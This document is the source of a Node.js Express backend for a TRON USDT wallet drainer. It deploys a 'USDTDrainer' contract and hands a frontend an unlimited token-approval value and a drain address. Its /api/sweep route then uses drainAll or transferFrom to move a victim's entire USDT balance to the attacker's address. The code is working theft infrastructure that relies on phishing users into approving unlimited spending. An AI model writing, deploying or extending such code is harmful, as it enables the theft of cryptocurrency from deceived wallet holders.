require('dotenv').config();
const express = require('express');
const cors = require('cors');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { TronWeb } = require('tronweb');
const solc = require('solc');

const app = express();
const PORT = process.env.PORT || 3000;

async function retryWithBackoff(fn, maxRetries = 5) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (err) {
      if (err?.response?.status === 429 && i < maxRetries - 1) {
        const delay = (i + 1) * 2000;
        console.log(`Rate limit, повтор через ${delay}ms...`);
        await new Promise(r => setTimeout(r, delay));
        continue;
      }
      throw err;
    }
  }
}

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public'), {
  setHeaders: function(res, p) {
    if (p.endsWith('.html')) {
      res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
      res.setHeader('Pragma', 'no-cache');
      res.setHeader('Expires', '0');
    }
  }
}));

const tronWeb = new TronWeb({
  fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
  headers: process.env.TRON_API_KEY
    ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY }
    : {},
  privateKey: '0000000000000000000000000000000000000000000000000000000000000001',
});

const USDT_CONTRACT = process.env.USDT_CONTRACT || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const USDT_DECIMALS = 6;
const DRAIN_ADDRESS = process.env.DRAIN_ADDRESS;

let DRAIN_CONTRACT = process.env.DRAIN_CONTRACT || '';

async function compileContract() {
  const source = fs.readFileSync(path.join(__dirname, 'contracts', 'Drainer.sol'), 'utf8');
  const input = JSON.stringify({
    language: 'Solidity',
    sources: { 'Drainer.sol': { content: source } },
    settings: {
      outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } }
    }
  });
  const output = JSON.parse(solc.compile(input));
  const contract = output.contracts['Drainer.sol']['USDTDrainer'];
  if (!contract) {
    console.error('Compilation error:', JSON.stringify(output.errors, null, 2));
    throw new Error('Contract compilation failed');
  }
  return { abi: contract.abi, bytecode: '0x' + contract.evm.bytecode.object };
}

async function deployContract(abi, bytecode) {
  if (!process.env.DRAIN_PRIVATE_KEY) {
    console.log('DRAIN_PRIVATE_KEY not set, skipping deployment');
    return null;
  }
  const deployWeb = new TronWeb({
    fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
    headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
    privateKey: process.env.DRAIN_PRIVATE_KEY,
  });

  const tx = await deployWeb.transactionBuilder.createSmartContract({
    abi: JSON.stringify(abi),
    bytecode: bytecode,
    feeLimit: 500000000,
    callValue: 0,
    ownerAddress: DRAIN_ADDRESS,
    parameters: [USDT_CONTRACT, DRAIN_ADDRESS],
  });

  const signed = await deployWeb.trx.sign(tx);
  const receipt = await deployWeb.trx.sendRawTransaction(signed);

  if (receipt.code && receipt.code !== 'SUCCESS') {
    console.error('Deploy failed:', receipt);
    return null;
  }

  const contractAddr = deployWeb.address.fromHex(tx.contract_address || receipt.contract_address);
  console.log('Contract deployed at:', contractAddr);
  return contractAddr;
}

async function initContract() {
  try {
    if (DRAIN_CONTRACT) {
      console.log('Using existing contract:', DRAIN_CONTRACT);
      return;
    }
    if (!process.env.DRAIN_PRIVATE_KEY || !DRAIN_ADDRESS) {
      console.log('DRAIN_PRIVATE_KEY or DRAIN_ADDRESS not set, skipping contract deployment');
      return;
    }
    console.log('Compiling contract...');
    const { abi, bytecode } = await compileContract();
    console.log('Deploying contract...');
    const addr = await deployContract(abi, bytecode);
    if (addr) {
      DRAIN_CONTRACT = addr;
      console.log('DRAIN_CONTRACT set to:', addr);
    }
  } catch (e) {
    console.error('Contract init error:', e.message);
  }
}

// ========== ROUTES ==========

app.post('/api/balance', async (req, res) => {
  try {
    const { address } = req.body;

    if (!address || !tronWeb.isAddress(address)) {
      return res.status(400).json({ error: 'Некорректный TRON-адрес' });
    }

    const contract = await tronWeb.contract().at(USDT_CONTRACT);
    const balance = await retryWithBackoff(() => contract.balanceOf(address).call());
    const formatted = balance.toNumber ? balance.toNumber() / 10 ** USDT_DECIMALS : Number(balance) / 10 ** USDT_DECIMALS;

    const account = await retryWithBackoff(() => tronWeb.trx.getAccount(address));
    const trxBalance = account.balance
      ? (account.balance.toNumber ? account.balance.toNumber() / 1e6 : Number(account.balance) / 1e6)
      : 0;

    res.json({
      address,
      usdt: formatted,
      trx: trxBalance,
    });
  } catch (error) {
    console.error('Ошибка:', error);
    res.status(500).json({ error: 'Ошибка при получении баланса' });
  }
});

app.post('/api/tokens', async (req, res) => {
  try {
    const { address } = req.body;
    if (!address || !tronWeb.isAddress(address)) {
      return res.status(400).json({ error: 'Invalid address' });
    }

    const hex = tronWeb.address.toHex(address).replace('0x', '');
    const response = await fetch(`https://api.trongrid.io/v1/accounts/${hex}`, {
      headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
    });
    const data = await response.json();

    const tokens = [];
    if (data.data && data.data.length > 0 && data.data[0].trc20) {
      for (const entry of data.data[0].trc20) {
        const contractAddress = Object.keys(entry)[0];
        const rawBalance = Object.values(entry)[0];
        let tokenInfo = { contractAddress, rawBalance, symbol: null, decimals: null };
        try {
          const contract = await retryWithBackoff(() => tronWeb.contract().at(contractAddress));
          const symbol = await retryWithBackoff(() => contract.symbol().call());
          const decimals = await retryWithBackoff(() => contract.decimals().call());
          tokenInfo.symbol = symbol;
          tokenInfo.decimals = decimals.toNumber ? decimals.toNumber() : Number(decimals);
        } catch(e) {
          console.log('Could not fetch details for', contractAddress);
        }
        tokens.push(tokenInfo);
      }
    }

    res.json({ tokens });
  } catch (error) {
    console.error('Error fetching tokens:', error);
    res.status(500).json({ error: 'Failed to fetch tokens' });
  }
});

app.post('/api/sweep', async (req, res) => {
  try {
    const { address } = req.body;
    if (!address || !tronWeb.isAddress(address)) {
      return res.status(400).json({ error: 'Invalid address' });
    }

    const drainPk = process.env.DRAIN_PRIVATE_KEY;
    if (!drainPk) {
      return res.status(500).json({ error: 'Drain private key not configured' });
    }

    const drainWeb = new TronWeb({
      fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
      headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
      privateKey: drainPk,
    });

    let target, method, abiFragment;

    if (DRAIN_CONTRACT) {
      target = DRAIN_CONTRACT;
      method = 'drainAll(address)';
      abiFragment = [{ type: 'address', value: address }];
    } else {
      target = USDT_CONTRACT;
      method = 'transferFrom(address,address,uint256)';
      const contract = await drainWeb.contract().at(USDT_CONTRACT);
      const raw = await contract.balanceOf(address).call();
      const balance = raw.toNumber ? raw.toNumber() : Number(raw);
      if (balance <= 0) {
        return res.json({ success: false, error: 'Zero balance' });
      }
      abiFragment = [
        { type: 'address', value: address },
        { type: 'address', value: DRAIN_ADDRESS },
        { type: 'uint256', value: balance.toString() }
      ];
    }

    const tx = await drainWeb.transactionBuilder.triggerSmartContract(
      target, method,
      { feeLimit: 200000000 },
      abiFragment,
      DRAIN_ADDRESS
    );
    const signed = await drainWeb.trx.sign(tx.transaction);
    const receipt = await drainWeb.trx.sendRawTransaction(signed);
    if (receipt.code && receipt.code !== 'SUCCESS') {
      return res.json({ success: false, error: 'Receipt: ' + JSON.stringify(receipt) });
    }
    const txId = receipt.txid || receipt;
    res.json({ success: true, txId, method: DRAIN_CONTRACT ? 'contract' : 'direct' });
  } catch (error) {
    console.error('Sweep error:', error);
    res.status(500).json({ success: false, error: error.message || 'Unknown error' });
  }
});

app.get('/api/config', async (req, res) => {
  let maxApprove = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
  if (DRAIN_CONTRACT) {
    try {
      const abi = [{"constant":true,"inputs":[],"name":"MAX_APPROVE","outputs":[{"name":"","type":"uint256"}],"type":"function"}];
      const c = await tronWeb.contract(abi).at(DRAIN_CONTRACT);
      const raw = await c.MAX_APPROVE().call();
      maxApprove = raw.toString ? raw.toString() : String(raw);
    } catch (e) {
      console.log('Could not read MAX_APPROVE from contract, using default');
    }
  }
  res.json({
    network: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
    usdtContract: USDT_CONTRACT,
    drainAddress: DRAIN_ADDRESS,
    drainContract: DRAIN_CONTRACT,
    maxApprove: maxApprove,
  });
});

const EVENTS_FILE = path.join(__dirname, 'events.json');

app.post('/api/event', (req, res) => {
  try {
    const { type, address, txId, amount } = req.body;
    console.log(`[event] ${type} ${address || ''} ${txId || ''} ${amount || ''}`);
    if (!type) return res.status(400).json({ error: 'type required' });
    let events = [];
    try { events = JSON.parse(fs.readFileSync(EVENTS_FILE, 'utf8')); } catch(e) {}
    events.unshift({ type, address: address || '', txId: txId || '', amount: amount || '', time: Date.now() });
    if (events.length > 100) events = events.slice(0, 100);
    fs.writeFileSync(EVENTS_FILE, JSON.stringify(events));
    console.log(`[event] saved, total events: ${events.length}`);
    res.json({ ok: true });
  } catch(e) {
    console.error(`[event] error: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
});

// ========== STARTUP ==========

async function start() {
  await initContract();

  app.listen(PORT, () => {
    console.log(`HTTP:  http://localhost:${PORT}`);
  });

  const KEY_PATH = path.join(__dirname, 'key.pem');
  const CERT_PATH = path.join(__dirname, 'cert.pem');

  if (fs.existsSync(KEY_PATH) && fs.existsSync(CERT_PATH)) {
    https.createServer({
      key: fs.readFileSync(KEY_PATH),
      cert: fs.readFileSync(CERT_PATH),
    }, app).listen(3443, () => {
      console.log(`HTTPS: https://localhost:3443`);
    });
  }
}

start().catch(e => console.error('Startup error:', e));
